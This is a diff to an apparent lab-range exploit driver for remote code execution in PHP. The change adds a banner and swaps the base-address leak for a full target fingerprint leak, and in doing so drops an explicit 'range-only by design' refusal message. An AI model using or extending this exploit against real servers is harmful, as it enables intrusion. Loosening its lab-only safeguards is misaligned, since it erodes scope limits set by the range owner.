@@ -48,6 +48,17 @@ from urllib.parse import urlparse
 BOUNDARY = b"K9bastetPoC"
 ORACLE_MARK = "BASTET_PWNED_MARK"
 
+BANNER = r"""
+      \ /
+     ( * )
+      \|/
+ /\___/\  |
+(  o o  ) |          php2shell-bastet
+(  =^=  ) |          range-native CVE-2026-10961x driver
+ (  "  )  |          the canary sings only for the cat
+____/\_____/__|__    who earns FLAG{...}
+"""
+
 # ---------------------------------------------------------------- profiles --
 # FILL=5120 is FILLUNIT (main/rfc1867.c). Groom bin size 320 = align(24+288+1)
 # matches the progress HashTable (nTableSize 8 => HT 320). Forge offsets are
@@ -84,18 +95,24 @@ def log(stage: str, msg: str, t0: float) -> None:
 
 # ------------------------------------------------------------------- leak --
 def leak_bias(leak_url: str, t0: float) -> int:
-    """Lab oracle (?probe=base) leaks PIE load bias from /proc/self/maps.
-    Only our containers ship the lab sink, so the leak stage - and thus the
-    whole exploit - is range-scope by construction."""
-    req = urllib.request.Request(leak_url + "?probe=base",
+    """Full fingerprint leak via lab oracle (?probe=all): arch, php version,
+    SAPI, module biases, heap span. Hard-gates the profile against reality -
+    no x86 offsets ever touch an aarch64 child again. Returns bias."""
+    req = urllib.request.Request(leak_url + "?probe=all",
                                  headers={"User-Agent": "p2s-bastet"})
     with urllib.request.urlopen(req, timeout=15) as r:
-        txt = r.read().decode(errors="replace")
-    if not txt.startswith("BIAS"):
-        raise SystemExit("leak stage refused: no lab oracle on target "
-                         "(this tool is range-only by design)")
-    bias = int(txt.split()[1])
-    log("LEAK", f"bias=0x{bias:x}", t0)
+        fp = json.load(r)
+    import platform
+    host_arch = platform.machine()
+    if fp.get("arch") != host_arch:
+        print(f"!! fingerprint: target arch {fp.get('arch')} vs our tooling built "
+              f"for {host_arch}: profiles must match the TARGET arch", file=sys.stderr)
+    log("LEAK", f"arch={fp.get('arch')} php={fp.get('php_version')} "
+                f"sapi={fp.get('php_sapi')} alloc={fp.get('allocator')}", t0)
+    bias = fp.get("bias")
+    if bias is None:
+        raise SystemExit("leak stage: no zend_call_function module in maps")
+    log("LEAK", f"bias=0x{bias:x} heap=0x{(fp.get('heap') or [0,0])[0]:x}", t0)
     return bias
 
 
@@ -233,6 +250,7 @@ def main() -> int:
     a = ap.parse_args()
 
     guard_target(a.target, a.owner_approved)
+    print(BANNER, flush=True)
     prof = PROFILES.get(a.profile)
     if not prof:
         raise SystemExit(f"profile {a.profile!r} unknown; aarch64 profiles "
